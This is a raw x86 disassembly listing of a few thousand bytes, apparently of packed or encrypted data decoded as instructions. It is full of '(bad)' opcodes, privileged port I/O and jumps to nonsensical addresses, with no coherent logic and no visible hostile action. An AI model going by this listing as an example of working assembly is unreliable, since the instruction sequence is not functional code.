  41719a:	lods   eax,DWORD PTR ds:[esi]
  41719b:	add    al,0xb
  41719d:	ins    DWORD PTR es:[edi],dx
  41719e:	cmc    
  41719f:	mov    DWORD PTR [ecx+0x52593e36],ebp
  4171a5:	push   eax
  4171a6:	mov    eax,ds:0xc2b18e80
  4171ab:	lods   eax,DWORD PTR ds:[esi]
  4171ac:	inc    ecx
  4171ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171ae:	test   al,0x3a
  4171b0:	pop    es
  4171b1:	pop    edi
  4171b2:	mov    edx,0x7788942d
  4171b7:	sahf   
  4171b8:	xor    DWORD PTR [esi+edx*2],esi
  4171bb:	test   BYTE PTR [esi],bl
  4171bd:	frstor [edx-0x5d]
  4171c0:	add    DWORD PTR [edx+0x63e24bca],edx
  4171c6:	inc    esi
  4171c7:	pushf  
  4171c8:	inc    esp
  4171c9:	pop    ebx
  4171ca:	inc    ebx
  4171cb:	mov    cl,0x92
  4171cd:	xor    eax,0xede99c09
  4171d2:	inc    edi
  4171d3:	rol    BYTE PTR [ebp+0x583272ad],0x61
  4171da:	adc    BYTE PTR [eax+edx*2],ch
  4171dd:	cs ins BYTE PTR es:[edi],dx
  4171df:	in     eax,dx
  4171e0:	inc    edx
  4171e1:	jl     0x4171da
  4171e3:	mov    dh,0xc5
  4171e5:	or     esi,edx
  4171e7:	in     eax,dx
  4171e8:	sbb    BYTE PTR [ebx-0x49],0x5
  4171ec:	gs sub dl,bl
  4171ef:	mov    eax,ds:0x6e37fb4b
  4171f4:	ins    DWORD PTR es:[edi],dx
  4171f5:	mov    ebx,0x2c2bef2e
  4171fa:	inc    esp
  4171fb:	ds mov bl,0xe8
  4171fe:	adc    bl,bl
  417200:	inc    edx
  417201:	add    BYTE PTR [ebp+0x45],cl
  417204:	ins    BYTE PTR es:[edi],dx
  417205:	xchg   edi,eax
  417206:	mov    ecx,0xfa1dd16e
  41720b:	repnz push ecx
  41720d:	xor    BYTE PTR [esi],0x2e
  417210:	ins    BYTE PTR es:[edi],dx
  417211:	je     0x417281
  417213:	sbb    esp,ecx
  417215:	test   al,0xa8
  417217:	repz or al,BYTE PTR [edi-0x3f]
  41721b:	mov    cs,WORD PTR [edi+0x1a]
  41721e:	xor    esp,DWORD PTR [edi]
  417220:	push   ss
  417221:	fiadd  DWORD PTR [ebp+0x10f8bc25]
  417227:	sahf   
  417228:	retf   
  417229:	outs   dx,BYTE PTR ds:[esi]
  41722a:	rcr    DWORD PTR [edi-0x22bfcbef],0x32
  417231:	add    ch,BYTE PTR [ecx]
  417233:	loop   0x41729f
  417235:	outs   dx,BYTE PTR ds:[esi]
  417236:	add    eax,0x75beb6a2
  41723b:	pop    ss
  41723c:	mov    cl,dh
  41723e:	test   edx,ecx
  417240:	adc    BYTE PTR [esi],0xba
  417243:	and    dh,bl
  417245:	push   DWORD PTR [edx+0x283ab6ce]
  41724b:	fsubr  DWORD PTR [edi]
  41724d:	popf   
  41724e:	inc    ecx
  41724f:	js     0x417230
  417251:	in     al,0xa5
  417253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417254:	lods   eax,DWORD PTR ds:[esi]
  417255:	(bad)  [ecx]
  417257:	sub    DWORD PTR [eax-0xe],0x5fa4847d
  41725e:	push   eax
  41725f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417260:	pop    ebx
  417261:	add    edx,ebx
  417263:	pop    es
  417264:	or     al,0x62
  417266:	push   ss
  417267:	sahf   
  417268:	cmp    DWORD PTR [ebx+0x2eaa9ad4],ecx
  41726e:	ins    BYTE PTR es:[edi],dx
  41726f:	jp     0x417241
  417271:	pop    esi
  417272:	je     0x417262
  417274:	pop    DWORD PTR [esi+esi*4-0x35faafe]
  41727b:	fistp  DWORD PTR [edx]
  41727d:	cmp    DWORD PTR [ebp+0x17],ebp
  417280:	xchg   esi,eax
  417281:	xchg   esi,eax
  417282:	pop    ss
  417283:	inc    esp
  417284:	xacquire xchg DWORD PTR [edx],edi
  417287:	repnz and BYTE PTR [edx+0x74],bh
  41728b:	inc    edi
  41728c:	jne    0x417237
  41728e:	mov    ch,0x65
  417290:	mov    WORD PTR [esi+0x4514a59],fs
  417296:	mov    ds:0xa2208da5,eax
  41729b:	dec    esi
  41729c:	mov    WORD PTR [esi*4-0x5cbd1dc5],?
  4172a3:	sbb    bl,0x1
  4172a6:	inc    ebp
  4172a7:	push   edx
  4172a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a9:	mov    eax,ds:0xb47db0df
  4172ae:	ins    DWORD PTR es:[edi],dx
  4172af:	fiadd  DWORD PTR [ebp-0x7c6b2d20]
  4172b5:	mov    DWORD PTR [ebp-0x5e],edx
  4172b8:	pop    ebx
  4172b9:	pop    ecx
  4172ba:	mov    edx,0x65297231
  4172bf:	inc    ecx
  4172c0:	lods   eax,DWORD PTR ds:[esi]
  4172c1:	and    DWORD PTR [eax+0x17],eax
  4172c4:	add    DWORD PTR [edi],edx
  4172c6:	cmp    ah,BYTE PTR [ecx*4+0x315157b2]
  4172cd:	in     eax,0xdb
  4172cf:	xchg   BYTE PTR [eax+0x28],ch
  4172d2:	into   
  4172d3:	mov    al,ds:0xa27a1371
  4172d8:	add    BYTE PTR [ecx+0x1b0b1bb6],ah
  4172de:	or     ebx,DWORD PTR [ecx+ebp*4]
  4172e1:	out    0xf0,eax
  4172e3:	call   0x856e361e
  4172e8:	lea    esp,[esi-0x6893fa78]
  4172ee:	test   BYTE PTR [esi+0x4],dl
  4172f1:	inc    ebp
  4172f2:	push   ebp
  4172f3:	stos   BYTE PTR es:[edi],al
  4172f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f5:	push   eax
  4172f6:	dec    ebp
  4172f7:	pop    eax
  4172f8:	repnz shl BYTE PTR [esi],1
  4172fb:	add    BYTE PTR [eax-0x187a2b0],dh
  417301:	cdq    
  417302:	xor    ch,BYTE PTR [esi+0x5bb8d6e2]
  417308:	ds sbb eax,0x69d871cf
  41730e:	mov    ebp,0x85a58db6
  417313:	sub    al,0xa0
  417315:	pusha  
  417316:	add    eax,0xb61590df
  41731b:	cmp    eax,0x235b8881
  417320:	ja     0x4172a8
  417322:	lahf   
  417323:	cld    
  417324:	and    BYTE PTR [edx-0x6d55696a],cl
  41732a:	or     BYTE PTR [eax+0xe28f280],dl
  417330:	pop    ebp
  417331:	call   0xf89d036d
  417336:	ret    
  417337:	jp     0x4172f0
  417339:	ret    0x5db6
  41733c:	loope  0x41735b
  41733e:	sub    eax,0x579befe9
  417343:	std    
  417344:	cmp    BYTE PTR [eax+0x43],cl
  417347:	(bad)  
  417348:	mov    dh,0x5d
  41734a:	push   ebp
  41734b:	les    esi,FWORD PTR [ebx]
  41734d:	iret   
  41734e:	or     al,BYTE PTR gs:0x1b1b4bf8
  417355:	in     eax,dx
  417356:	sbb    dh,dl
  417358:	fidivr DWORD PTR [esi+0x67]
  41735b:	pusha  
  41735c:	rcl    DWORD PTR [edx-0x5a77dc86],cl
  417362:	or     ebx,DWORD PTR [ecx]
  417364:	and    ecx,DWORD PTR [eax+0xb]
  417367:	add    al,BYTE PTR [eax-0x5225ddaf]
  41736d:	jge    0x417389
  41736f:	jmp    0xb5ba:0x806e0572
  417376:	mov    al,0x1b
  417378:	mov    ?,WORD PTR [eax-0x7f]
  41737b:	xor    DWORD PTR [edi],ebx
  41737d:	iret   
  41737e:	mov    dh,0x6d
  417380:	arpl   WORD PTR [ebx-0x6],bp
  417383:	xchg   ecx,eax
  417384:	out    0x93,al
  417386:	pop    ebp
  417387:	xchg   DWORD PTR [edi-0x1dae256a],esp
  41738d:	push   edx
  41738e:	add    edx,ebx
  417390:	jno    0x417379
  417392:	xor    al,BYTE PTR [ecx-0x12]
  417395:	mov    esp,0x826b7005
  41739a:	popa   
  41739b:	sar    BYTE PTR [ebx],0x74
  41739e:	dec    ebx
  41739f:	mov    dh,0x89
  4173a1:	push   0x1e4316db
  4173a6:	mov    al,0xa4
  4173a8:	sar    DWORD PTR [ecx+ebp*1-0x56],0x68
  4173ad:	mov    ah,al
  4173af:	ret    
  4173b0:	sbb    bl,BYTE PTR [ebp+0x550eddba]
  4173b6:	test   eax,0x30dd0fa2
  4173bb:	enter  0xc295,0x68
  4173bf:	jg     0x4173ff
  4173c1:	test   eax,0xefaaad88
  4173c6:	mov    DWORD PTR ds:0xd6c2c32,esp
  4173cc:	mov    al,0x95
  4173ce:	jge    0x41744c
  4173d0:	push   edx
  4173d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173d2:	addr16 pop ebx
  4173d4:	imul   DWORD PTR [ebp+0x0]
  4173d7:	fsubr  DWORD PTR [esi]
  4173d9:	jae    0x4173d6
  4173db:	xchg   ecx,eax
  4173dc:	pop    esp
  4173dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173de:	std    
  4173df:	and    edx,ebp
  4173e1:	inc    edx
  4173e2:	aam    0x10
  4173e4:	mov    al,0xe6
  4173e6:	sbb    DWORD PTR [edi+eax*2],edi
  4173e9:	and    al,BYTE PTR [ecx+0x35d2f2e0]
  4173ef:	aam    0x49
  4173f1:	add    bl,ah
  4173f3:	ret    
  4173f4:	mov    dh,ah
  4173f6:	add    eax,DWORD PTR ds:0x8c4addb
  4173fc:	pushf  
  4173fd:	cmp    eax,0x2da85223
  417402:	adc    al,0xb4
  417404:	ins    DWORD PTR es:[edi],dx
  417405:	scas   eax,DWORD PTR es:[edi]
  417406:	sub    bl,dl
  417408:	bound  edx,QWORD PTR [esi-0x3c]
  41740b:	das    
  41740c:	in     eax,dx
  41740d:	inc    esi
  41740e:	add    ebp,DWORD PTR [eax+0x19f67317]
  417414:	test   DWORD PTR [ebx+edi*4+0x661bb56c],ecx
  41741b:	inc    ebp
  41741c:	adc    DWORD PTR [ebp-0x665e5f09],edx
  417422:	add    ah,BYTE PTR [edx-0x5f]
  417425:	sbb    dl,BYTE PTR [ebp+0x37]
  417428:	mov    BYTE PTR [edi],dl
  41742a:	fist   DWORD PTR [ecx]
  41742c:	mov    cl,0xab
  41742e:	shl    BYTE PTR [esi-0x35b1d45c],0x5f
  417435:	ins    BYTE PTR es:[edi],dx
  417436:	mov    ds:0x4aa616d,al
  41743b:	push   es
  41743c:	repnz sub cl,ah
  41743f:	xor    BYTE PTR [edx+0x2b76b62a],bl
  417445:	mov    ebp,DWORD PTR [edx-0x2b13ece8]
  41744b:	adc    BYTE PTR [esp+esi*4],al
  41744e:	add    DWORD PTR [esi-0x5f3239e2],esi
  417454:	mov    ds:0x36da88ed,eax
  417459:	adc    BYTE PTR [edi-0x52116762],0xa5
  417460:	jbe    0x4174c3
  417462:	and    BYTE PTR [edx],dh
  417464:	adc    eax,0x4d86ce7
  417469:	or     esi,DWORD PTR [ecx-0x368d368b]
  41746f:	into   
  417470:	jmp    0x3502:0x1ab75124
  417477:	or     eax,0x8130b0df
  41747c:	fisubr DWORD PTR [esi+0x34]
  41747f:	mov    ss,ebx
  417481:	(bad)  
  417482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417483:	mov    edx,0x2e8dcf20
  417488:	xor    al,0xd4
  41748a:	lods   eax,DWORD PTR ds:[esi]
  41748b:	(bad)  
  41748c:	cmc    
  41748d:	pusha  
  41748e:	in     al,0xf7
  417490:	pop    edi
  417491:	and    dl,dl
  417493:	or     cl,BYTE PTR [ebx+0x26]
  417496:	or     bh,BYTE PTR [edi]
  417498:	xchg   DWORD PTR [esi+0x7a07b50b],edx
  41749e:	jb     0x41745b
  4174a0:	ins    DWORD PTR es:[edi],dx
  4174a1:	dec    ebx
  4174a2:	dec    ebx
  4174a3:	ja     0x41748e
  4174a5:	and    ebp,eax
  4174a7:	or     BYTE PTR [ebx+0x71],cl
  4174aa:	add    ebx,DWORD PTR [edi+0x5ba0ae86]
  4174b0:	arpl   WORD PTR [eax+0x6c],di
  4174b3:	inc    esp
  4174b4:	push   es
  4174b5:	adc    DWORD PTR [edi-0x5272283e],ebp
  4174bb:	push   ecx
  4174bc:	int    0x3b
  4174be:	push   ds
  4174bf:	ins    DWORD PTR es:[edi],dx
  4174c0:	mov    BYTE PTR [ecx+0x2bab589c],ch
  4174c6:	mov    ds:0xb3d4bddb,al
  4174cb:	cmc    
  4174cc:	sbb    esi,DWORD PTR [edx+0x2b]
  4174cf:	cs je  0x417523
  4174d2:	jno    0x4174ca
  4174d4:	pop    ecx
  4174d5:	adc    BYTE PTR [edx-0x24ac2499],al
  4174db:	sbb    cl,BYTE PTR ss:[edx+0x77ea42e0]
  4174e2:	pop    ss
  4174e3:	shr    ah,0x6b
  4174e6:	mov    bh,0xa5
  4174e8:	ins    DWORD PTR es:[edi],dx
  4174e9:	sub    ch,BYTE PTR [edi]
  4174eb:	(bad)  
  4174ec:	mov    dh,0xb7
  4174ee:	push   ebx
  4174ef:	bound  ecx,QWORD PTR ds:0xb443ce77
  4174f5:	je     0x417560
  4174f7:	sub    DWORD PTR [eax+eiz*1-0x7a059d01],ecx
  4174fe:	mov    esi,0xe95bb5b0
  417503:	into   
  417504:	inc    esi
  417505:	xor    al,0x56
  417507:	cwde   
  417508:	push   ds
  417509:	push   edx
  41750a:	int    0x22
  41750c:	add    BYTE PTR [ebx-0x7e],ch
  41750f:	or     eax,0x1986dc00
  417514:	add    al,0xc6
  417516:	(bad)  
  417517:	rcl    esi,1
  417519:	mov    dh,0x82
  41751b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41751c:	ds jbe 0x417514
  41751f:	fadd   st,st(2)
  417521:	sub    al,0x5b
  417523:	sub    al,BYTE PTR [eax-0x1d]
  417526:	or     BYTE PTR [edi+0x4e65286c],0x86
  41752d:	adc    al,0x36
  41752f:	inc    ebp
  417530:	je     0x417572
  417532:	daa    
  417533:	and    eax,0x82ebf83f
  417538:	ins    DWORD PTR es:[edi],dx
  417539:	mov    ebx,0xa116096d
  41753e:	mov    al,ds:0x3272f545
  417543:	out    0x2e,al
  417545:	xchg   esp,eax
  417546:	das    
  417547:	ins    BYTE PTR es:[edi],dx
  417548:	lods   eax,DWORD PTR ds:[esi]
  417549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41754a:	loope  0x417522
  41754c:	add    DWORD PTR [eax],0x40
  41754f:	repz inc eax
  417551:	ins    BYTE PTR es:[edi],dx
  417552:	stc    
  417553:	ins    DWORD PTR es:[edi],dx
  417554:	and    DWORD PTR [esi+0x1bf6b482],0x5b805c11
  41755e:	push   edi
  41755f:	aad    0x95
  417561:	xlat   BYTE PTR ds:[ebx]
  417562:	jbe    0x4175ae
  417564:	lods   eax,DWORD PTR ds:[esi]
  417565:	jl     0x41753f
  417567:	push   edi
  417568:	shl    BYTE PTR [esi+0x2987d201],0xe
  41756f:	stos   BYTE PTR es:[edi],al
  417570:	lahf   
  417571:	sub    al,0x4
  417573:	ins    DWORD PTR es:[edi],dx
  417574:	imul   ebx,DWORD PTR [ebx],0x37
  417577:	lods   al,BYTE PTR ds:[esi]
  417578:	and    BYTE PTR ds:0x6d2d321a,bl
  41757e:	pop    ebp
  41757f:	adc    DWORD PTR [edi+0x23f67af0],edx
  417585:	sti    
  417586:	fdiv   DWORD PTR [esi+0x7d9ec96d]
  41758c:	repz inc ecx
  41758e:	add    bl,bh
  417590:	(bad)  
  417591:	and    ecx,DWORD PTR [eax]
  417593:	fild   DWORD PTR [eax]
  417595:	pop    ss
  417596:	fadd   DWORD PTR [edx-0x6d]
  417599:	dec    esi
  41759a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41759b:	test   esi,ebp
  41759d:	fcom   DWORD PTR [esi]
  41759f:	xlat   BYTE PTR ds:[ebx]
  4175a0:	ins    BYTE PTR es:[edi],dx
  4175a1:	in     eax,dx
  4175a2:	(bad)  
  4175a3:	inc    edx
  4175a4:	pop    ebx
  4175a5:	(bad)  
  4175a6:	(bad)  
  4175a8:	shl    BYTE PTR [edi-0x2d49192f],cl
  4175ae:	mov    dh,0x40
  4175b0:	(bad)  
  4175b1:	push   edx
  4175b2:	cwde   
  4175b3:	dec    edi
  4175b4:	jp     0x417630
  4175b6:	out    dx,al
  4175b7:	jne    0x4175be
  4175b9:	ins    DWORD PTR es:[edi],dx
  4175ba:	pop    ss
  4175bb:	mov    ch,0xb2
  4175bd:	or     BYTE PTR [eax-0x1416f28c],bl
  4175c3:	ficomp DWORD PTR [edx]
  4175c5:	mov    ch,0x47
  4175c7:	ja     0x417620
  4175c9:	mov    esp,0xf28c374d
  4175ce:	aad    0x2e
  4175d0:	ins    DWORD PTR es:[edi],dx
  4175d1:	pop    ebx
  4175d2:	push   eax
  4175d3:	loope  0x4175ec
  4175d5:	dec    edi
  4175d6:	inc    edi
  4175d7:	jnp    0x417569
  4175d9:	sub    DWORD PTR [esi],edx
  4175db:	ds mov ch,0x50
  4175de:	icebp  
  4175df:	inc    ebp
  4175e0:	cdq    
  4175e1:	adc    ebp,ebp
  4175e3:	push   ebp
  4175e4:	mov    bl,0x85
  4175e6:	(bad)  
  4175e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e8:	or     ah,dl
  4175ea:	xor    ebp,DWORD PTR [ebp+0x3f]
  4175ed:	fist   WORD PTR [edi+esi*1+0x16]
  4175f1:	mov    dh,0xa3
  4175f3:	push   cs
  4175f4:	and    BYTE PTR ds:0xa7cc5a04,ah
  4175fa:	(bad)  [edi]
  4175fc:	outs   dx,BYTE PTR ds:[esi]
  4175fd:	sbb    eax,0x6e3b1be2
  417602:	test   BYTE PTR [ebp-0x21c12bfc],al
  417608:	gs test al,0xd
  41760b:	adc    al,0x5b
  41760d:	mov    bl,0x86
  41760f:	inc    ebx
  417610:	adc    ch,BYTE PTR [esp+edx*4+0x36]
  417614:	sub    eax,0xf66bc1b6
  417619:	push   esi
  41761a:	clc    
  41761b:	imul   ebp,DWORD PTR [ecx+0x6b],0x3ec550db
  417622:	inc    ecx
  417623:	pop    ss
  417624:	scas   al,BYTE PTR es:[edi]
  417625:	inc    ecx
  417626:	data16 ja 0x4175b7
  417629:	adc    BYTE PTR [esi+0x3f628c60],0x2a
  417630:	or     ebx,DWORD PTR [ebx]
  417632:	xchg   BYTE PTR [esi+0x5ec3599],dh
  417638:	dec    ebx
  417639:	enter  0xd3e8,0x5b
  41763d:	sub    al,0xb4
  41763f:	dec    ebx
  417640:	shl    DWORD PTR [ebx],1
  417642:	call   FWORD PTR [edi-0x36]
  417645:	lods   eax,DWORD PTR ds:[esi]
  417646:	dec    esi
  417647:	arpl   WORD PTR [edi],dx
  417649:	push   0xdafc1b80
  41764e:	mul    BYTE PTR [ecx+0x42]
  417651:	dec    eax
  417652:	stc    
  417653:	mov    ah,0x6d
  417655:	pop    ss
  417656:	add    al,0xb
  417658:	call   0xba351523
  41765d:	add    DWORD PTR ds:[edi-0x7be47f52],esi
  417664:	push   ss
  417665:	cmp    BYTE PTR ds:0x6d02db4a,cl
  41766b:	inc    edi
  41766c:	xlat   BYTE PTR ds:[ebx]
  41766d:	sub    eax,0x32e783b8
  417672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417673:	aad    0x60
  417675:	mov    ebx,0xb0aeb42d
  41767a:	sub    esp,ebp
  41767c:	clc    
  41767d:	mov    ch,0x9c
  41767f:	xor    eax,0xab63762e
  417684:	mov    eax,ds:0xde1cdd25
  417689:	mov    bh,0x85
  41768b:	xchg   dx,ax
  41768d:	ret    0xf946
  417690:	lods   eax,DWORD PTR ds:[esi]
  417691:	mov    edx,DWORD PTR [ebp+0x3f990003]
  417697:	or     al,0xfc
  417699:	push   ss
  41769a:	jmp    0x41761e
  41769c:	pusha  
  41769d:	jmp    0x41763e
  41769f:	loop   0x417668
  4176a1:	adc    eax,0x50a15d05
  4176a6:	and    dl,bl
  4176a8:	pusha  
  4176a9:	jne    0x417710
  4176ab:	aam    0xc3
  4176ad:	xchg   esi,eax
  4176ae:	mov    ds:0x1182a255,al
  4176b3:	fucomip st,st(0)
  4176b5:	cmp    DWORD PTR [esi+0x6102a6a5],ecx
  4176bb:	aas    
  4176bc:	cmp    BYTE PTR [eax-0x1f],al
  4176bf:	fimul  DWORD PTR [edx]
  4176c1:	add    al,0x4b
  4176c3:	pop    esp
  4176c4:	xor    edx,0xc883b108
  4176ca:	add    al,0xdc
  4176cc:	fld    DWORD PTR [esi+0x6a]
  4176cf:	test   DWORD PTR [esi],ecx
  4176d1:	add    ebx,DWORD PTR [ebp-0x50]
  4176d4:	jno    0x4176c7
  4176d6:	sbb    ecx,DWORD PTR es:[ecx-0x27]
  4176da:	jecxz  0x41774e
  4176dc:	xchg   esp,eax
  4176dd:	test   al,0x85
  4176df:	or     eax,0x7dd61e4b
  4176e4:	pop    esi
  4176e5:	dec    ebx
  4176e6:	retf   
  4176e7:	aaa    
  4176e8:	pop    esp
  4176e9:	aas    
  4176ea:	adc    cl,BYTE PTR [ecx+0x1d]
  4176ed:	add    BYTE PTR [ecx+0x6a98389c],bl
  4176f3:	fld    TBYTE PTR [esi+0x4b]
  4176f6:	fwait
  4176f7:	add    DWORD PTR [ecx+0x3a4771e1],ecx
  4176fd:	sbb    eax,0xeb622d2a
  417702:	or     dl,BYTE PTR [edx-0x59ae01e3]
  417708:	pop    ebp
  417709:	fcomp  DWORD PTR [edx-0x5600c556]
  41770f:	or     edx,esp
  417711:	inc    eax
  417712:	(bad)  
  417713:	push   edi
  417714:	fistp  QWORD PTR [edx+0x48344175]
  41771a:	(bad)
  41771d:	dec    esp
  41771e:	fld    QWORD PTR [eax]
  417720:	std    
  417721:	test   esi,edx
  417723:	outs   dx,BYTE PTR ds:[esi]
  417724:	jl     0x417752
  417726:	or     DWORD PTR [ebx+0x6f7957cb],ebp
  41772c:	adc    DWORD PTR ds:0xe00badc4,esi
  417732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417733:	sub    BYTE PTR [ecx],bl
  417735:	fnstenv ds:0xb1b6e26a
  41773b:	rol    DWORD PTR [ebp+0x3b],1
  41773e:	push   esi
  41773f:	daa    
  417740:	test   eax,0xc176ecf5
  417746:	rol    dl,0xa9
  417749:	fsubr  QWORD PTR [ecx+ecx*1]
  41774c:	mov    BYTE PTR [edx-0x4a92703f],al
  417752:	dec    ebp
  417753:	(bad)
  417756:	xlat   BYTE PTR ds:[ebx]
  417757:	xor    dl,bh
  417759:	mov    eax,0x4adb634
  41775e:	sub    al,0x1a
  417760:	and    eax,DWORD PTR [edi]
  417762:	fld    QWORD PTR [edi+0x4507236e]
  417768:	sbb    edx,DWORD PTR [edi]
  41776a:	dec    ecx
  41776b:	xchg   esp,eax
  41776c:	pop    es
  41776d:	leave  
  41776e:	and    esp,DWORD PTR [ecx-0x4a]
  417771:	mov    ch,0x6d
  417773:	arpl   WORD PTR [ebp-0x68],sp
  417776:	adc    eax,0x2f473ef6
  41777b:	push   ebx
  41777c:	inc    edx
  41777d:	retf   
  41777e:	outs   dx,BYTE PTR ds:[esi]
  41777f:	pop    ebx
  417780:	fcmovnb st,st(2)
  417782:	scas   eax,DWORD PTR es:[edi]
  417783:	hlt    
  417784:	pop    esi
  417785:	das    
  417786:	lds    edx,FWORD PTR [ecx-0x71e849e9]
  41778c:	test   al,0xba
  41778e:	rcl    DWORD PTR [esi-0x3be7d3e],1
  417794:	push   edx
  417795:	cvttps2pi mm6,QWORD PTR [esp+eax*1]
  417799:	ins    BYTE PTR es:[edi],dx
  41779a:	rcl    DWORD PTR [edi],0xb4
  41779d:	in     al,0x4f
  41779f:	push   ss
  4177a0:	cmp    ah,bh
  4177a2:	mov    al,ds:0x80612dba
  4177a7:	or     cl,al
  4177a9:	leave  
  4177aa:	(bad)  
  4177ab:	lds    ecx,FWORD PTR [ebx+0x55]
  4177ae:	fild   DWORD PTR [edx-0x3a]
  4177b1:	loop   0x41775f
  4177b3:	push   cs
  4177b4:	sub    eax,0xa09a0cf8
  4177b9:	retf   
  4177ba:	pop    ebx
  4177bb:	add    DWORD PTR [esi],ebx
  4177bd:	add    BYTE PTR [edx-0x45],bh
  4177c0:	lea    eax,[esi]
  4177c2:	mov    ecx,0x96170a97
  4177c7:	mov    bl,0x6b
  4177c9:	pop    eax
  4177ca:	outs   dx,DWORD PTR ds:[esi]
  4177cb:	push   cs
  4177cc:	xchg   esp,eax
  4177cd:	jecxz  0x4177e1
  4177cf:	arpl   WORD PTR [ebx+0x5b],cx
  4177d2:	(bad)  
  4177d3:	in     eax,0x0
  4177d5:	out    dx,al
  4177d6:	sub    BYTE PTR [esp],0x3a
  4177da:	repnz push cs
  4177dc:	mov    esi,edi
  4177de:	sbb    ecx,DWORD PTR [ebx]
  4177e0:	sbb    ecx,DWORD PTR [esi+eiz*4]
  4177e3:	push   edx
  4177e4:	jne    0x4177a9
  4177e6:	ret    
  4177e7:	lds    eax,FWORD PTR [eax]
  4177e9:	sub    DWORD PTR [eax+0x0],edx
  4177ec:	dec    edx
  4177ed:	jb     0x417791
  4177ef:	mov    al,0x29
  4177f1:	pop    eax
  4177f2:	call   0x1c856d30
  4177f7:	mov    cl,BYTE PTR [ebp-0x146027a8]
  4177fd:	cmp    al,BYTE PTR [ecx+0x72c4730e]
  417803:	mov    ds:0xc6785f03,eax
  417808:	test   BYTE PTR [edx],bh
  41780a:	cmp    edx,esi
  41780c:	outs   dx,BYTE PTR ds:[esi]
  41780d:	ins    BYTE PTR es:[edi],dx
  41780e:	je     0x417854
  417810:	inc    ecx
  417811:	xchg   DWORD PTR [esi+0x68196606],ebx
  417817:	add    eax,0xed8889a3
  41781c:	sti    
  41781d:	xchg   esp,eax
  41781e:	jge    0x417811
  417820:	out    0x4,eax
  417822:	iret   
  417823:	rcl    esi,0x54
  417826:	je     0x4177c4
  417828:	sbb    eax,0xd6fec5d8
  41782d:	pusha  
  41782e:	inc    edi
  41782f:	inc    esp
  417830:	or     ebx,DWORD PTR [eax-0x7784f452]
  417836:	add    bl,bl
  417838:	mov    dh,0x1
  41783a:	mov    BYTE PTR [ebx],bl
  41783c:	les    edx,FWORD PTR [edi]
  41783e:	retf   0x5686
  417841:	ins    DWORD PTR es:[edi],dx
  417842:	sub    edx,ecx
  417844:	sbb    al,0xc6
  417846:	add    DWORD PTR [edx],edi
  417848:	adc    eax,edi
  41784a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41784b:	sbb    cl,BYTE PTR [eax-0xc5a3eb3]
  417851:	shl    BYTE PTR [edi-0x40],cl
  417854:	inc    esi
  417855:	xchg   esi,eax
  417856:	ss ss inc esp
  417859:	pop    ss
  41785a:	dec    ecx
  41785b:	jmp    0xc221:0xd605ac9f
  417862:	mov    al,ds:0x95d8223a
  417867:	pop    edi
  417868:	sbb    bl,ch
  41786a:	adc    DWORD PTR ds:0xee119f11,ebx
  417870:	fimul  DWORD PTR ds:0x14074039
  417876:	sbb    eax,DWORD PTR [ebx+0x38]
  417879:	xor    bh,BYTE PTR [eax]
  41787b:	adc    eax,0x665adb74
  417880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417881:	lods   al,BYTE PTR ds:[esi]
  417882:	out    dx,eax
  417883:	les    edx,FWORD PTR [edi]
  417885:	mov    ch,0xed
  417887:	xor    BYTE PTR [esi],0xa8
  41788a:	or     eax,DWORD PTR [esp+ebp*1-0x18]
  41788e:	jp     0x4178e4
  417890:	aaa    
  417891:	ins    BYTE PTR es:[edi],dx
  417892:	or     al,bl
  417894:	adc    DWORD PTR [eax+esi*4-0x23ec8458],esp
  41789b:	push   es
  41789c:	push   ebp
  41789d:	mov    ds:0xe6bfb228,al
  4178a2:	gs pusha 
  4178a4:	imul   esi,DWORD PTR [edi-0x4c4aefcb],0xffffffec
  4178ab:	xchg   ebp,eax
  4178ac:	lea    eax,[edi]
  4178ae:	aam    0x85
  4178b0:	inc    esi
  4178b1:	or     dh,BYTE PTR [ebx-0x45]
  4178b4:	fistp  WORD PTR [edx+0x6d]
  4178b7:	mov    bh,0x9a
  4178b9:	bound  eax,QWORD PTR [ecx]
  4178bb:	in     al,0xe5
  4178bd:	scas   eax,DWORD PTR es:[edi]
  4178be:	lods   al,BYTE PTR ds:[esi]
  4178bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c0:	(bad)  
  4178c1:	es in  al,dx
  4178c3:	je     0x417866
  4178c5:	aam    0xad
  4178c7:	and    BYTE PTR [ebx+0x2530d544],dl
  4178cd:	shl    al,1
  4178cf:	fidiv  DWORD PTR [esi+0x50]
  4178d2:	mov    cl,0xec
  4178d4:	xor    al,0xc
  4178d6:	adc    edx,esp
  4178d8:	sbb    cl,BYTE PTR [edx-0x5e4a8248]
  4178de:	pop    esp
  4178df:	sbb    ch,0xf5
  4178e2:	pop    es
  4178e3:	loopne 0x417930
  4178e5:	(bad)  
  4178e6:	ins    DWORD PTR es:[edi],dx
  4178e7:	sub    ah,dl
  4178e9:	(bad)  
  4178ea:	dec    eax
  4178eb:	or     BYTE PTR [ebx],cl
  4178ed:	mov    bl,0x20
  4178ef:	aas    
  4178f0:	ficom  WORD PTR [edi-0x2b]
  4178f3:	ins    DWORD PTR es:[edi],dx
  4178f4:	mov    ds:0x447c9011,eax
  4178f9:	xchg   esi,eax
  4178fa:	outs   dx,BYTE PTR ds:[esi]
  4178fb:	fcomp  QWORD PTR [edx-0x11a45278]
  417901:	sbb    BYTE PTR [ecx+eax*4+0x4adaaaeb],0xb6
  417909:	fstp   QWORD PTR [edx-0x28]
  41790c:	ja     0x417901
  41790e:	mov    ds:0x5d403433,eax
  417913:	fimul  DWORD PTR [ecx]
  417915:	shl    DWORD PTR [edi-0x2f25f23a],1
